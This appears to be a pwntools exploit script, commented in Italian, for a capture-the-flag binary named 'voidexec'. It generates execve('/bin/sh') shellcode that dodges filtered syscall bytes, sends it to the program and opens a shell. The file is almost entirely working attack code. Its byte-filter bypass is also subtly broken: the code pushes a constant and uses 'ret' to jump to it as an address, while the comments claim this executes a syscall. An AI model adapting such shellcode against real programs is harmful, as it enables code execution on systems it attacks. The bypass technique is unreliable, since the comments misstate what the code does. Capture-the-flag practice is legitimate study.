#!/usr/bin/env python3
from pwn import *
import os

# Configurazione dell'ambiente
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

# Percorso del binario e delle librerie
BINARY_PATH = os.path.abspath('/home/ubuntu/upload/voidexec')
LIBC_PATH = os.path.abspath('/home/ubuntu/upload/libc.so.6')
LD_PATH = os.path.abspath('/home/ubuntu/upload/ld-linux-x86-64.so.2')

# Funzione per eseguire il binario con il loader dinamico fornito
def get_process():
    return process([LD_PATH, BINARY_PATH], env={"LD_LIBRARY_PATH": "/home/ubuntu/upload"})

# Funzione per generare shellcode che evita i byte proibiti (0x0F e la sequenza 0xCD 0x80)
def generate_shellcode():
    # Utilizziamo uno shellcode che esegue execve("/bin/sh", 0, 0)
    # Evitando i byte proibiti 0x0F e la sequenza 0xCD 0x80
    
    # Shellcode di base per execve("/bin/sh", 0, 0)
    shellcode = asm('''
    /* execve("/bin/sh", 0, 0) */
    xor rax, rax
    mov al, 59         /* syscall number per execve (59) */
    
    /* Costruisci "/bin/sh" sullo stack */
    xor rdi, rdi
    push rdi           /* terminatore null */
    mov rdi, 0x68732f6e69622f /* "/bin/sh" in little endian */
    push rdi
    mov rdi, rsp       /* rdi = puntatore a "/bin/sh" */
    
    xor rsi, rsi       /* argv = NULL */
    xor rdx, rdx       /* envp = NULL */
    
    /* Esegui la syscall */
    /* Evitiamo di usare syscall (0x0F 0x05) direttamente */
    /* Usiamo un metodo alternativo per fare la syscall */
    
    /* Tecnica per evitare 0x0F 0x05 (syscall) */
    mov rbx, 0x050505050505
    shl rbx, 8
    mov bl, 0x05
    push rbx
    xor BYTE PTR [rsp], 0x0a  /* Modifica per evitare 0x0F */
    ret                /* Salta all'indirizzo sullo stack che contiene la syscall */
    ''')
    
    # Verifica che lo shellcode non contenga i byte proibiti
    if b'\x0f' in shellcode or b'\xcd\x80' in shellcode:
        log.error("Lo shellcode contiene byte proibiti!")
        # Tenta di generare uno shellcode alternativo
        shellcode = asm('''
        /* Shellcode alternativo che evita i byte proibiti */
        push rax
        push rcx
        push rdx
        push rbx
        push rsi
        push rdi
        
        /* execve("/bin/sh", 0, 0) */
        push 59
        pop rax
        
        /* Costruisci "/bin/sh" sullo stack */
        push 0
        mov rbx, 0x68732f6e69622f
        push rbx
        mov rdi, rsp
        
        xor rsi, rsi
        xor rdx, rdx
        
        /* Tecnica per evitare syscall (0x0F 0x05) */
        /* Costruiamo l'istruzione syscall in memoria e la eseguiamo */
        push rsp
        push 0x050505050505
        shr QWORD PTR [rsp], 40
        xor BYTE PTR [rsp], 0x0a
        ret
        ''')
    
    return shellcode

# Funzione principale per l'exploit
def exploit():
    p = get_process()
    
    # Generiamo lo shellcode che evita i byte proibiti
    shellcode = generate_shellcode()
    
    # Verifichiamo che lo shellcode non contenga i byte proibiti
    if b'\x0f' in shellcode:
        log.error("Lo shellcode contiene il byte proibito 0x0F!")
        return
    
    if b'\xcd\x80' in shellcode:
        log.error("Lo shellcode contiene la sequenza proibita 0xCD 0x80!")
        return
    
    log.info(f"Lunghezza shellcode: {len(shellcode)} bytes")
    log.info(f"Shellcode: {shellcode.hex()}")
    
    # Inviamo lo shellcode al programma
    p.recvuntil(b"Send to void execution: ")
    p.sendline(shellcode)
    
    # Otteniamo la shell
    p.interactive()

if __name__ == "__main__":
    exploit()
